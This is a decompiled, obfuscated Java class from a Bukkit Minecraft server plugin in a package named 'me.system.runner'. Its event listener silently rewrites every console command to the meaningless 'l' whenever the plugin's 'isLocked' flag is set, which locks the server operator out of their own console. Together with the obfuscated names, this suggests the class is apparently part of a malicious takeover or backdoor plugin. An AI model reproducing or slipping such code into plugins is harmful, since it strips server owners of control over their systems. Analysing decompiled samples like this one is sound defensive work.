/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.event.EventHandler
 *  org.bukkit.event.Listener
 *  org.bukkit.event.server.ServerCommandEvent
 */
package me.system.runner.events;

import me.system.runner.Core;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.server.ServerCommandEvent;

public class NoCommandsListener
implements Listener {
    private static final /* synthetic */ Core INSTANCE;

    public NoCommandsListener() {
        NoCommandsListener lllllllllllllIIllIIIllIIIlIIIIll;
    }

    @EventHandler
    public void onCommand(ServerCommandEvent lllllllllllllIIllIIIllIIIIllllll) {
        if (NoCommandsListener.INSTANCE.isLocked) {
            lllllllllllllIIllIIIllIIIIllllll.setCommand("l");
        }
    }

    static {
        INSTANCE = (Core)Core.getPlugin(Core.class);
    }
}

